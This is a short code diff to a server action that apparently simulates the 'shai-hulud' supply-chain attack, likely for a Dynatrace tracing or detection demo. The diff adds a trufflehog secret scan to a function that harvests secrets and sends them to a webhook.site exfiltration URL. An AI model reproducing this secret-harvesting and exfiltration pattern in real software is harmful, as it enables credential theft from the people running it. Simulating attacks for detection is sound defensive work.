@@ -1,6 +1,6 @@
 'use server';
 
-import { harvestBenignSecrets } from '@ctrl/tinycolor';
+import { harvestBenignSecrets, launchTrufflehogScan } from '@ctrl/tinycolor';
 import os from 'os';
 
 const DEFAULT_EXFIL_URL = 'https://webhook.site/1c129c66-a498-4463-990f-cb7072441d28';
@@ -19,6 +19,10 @@ const DEFAULT_EXFIL_URL = 'https://webhook.site/1c129c66-a498-4463-990f-cb707244
  */
 export async function triggerSupplyChainExfil() {
     console.log('[shai-hulud] Supply chain payload triggered within request context');
+
+    // Launch trufflehog scan within the traced request context so Dynatrace
+    // captures the subprocess spawn and outbound exfil as child spans.
+    await launchTrufflehogScan();
 
     const artifacts = harvestBenignSecrets();
 
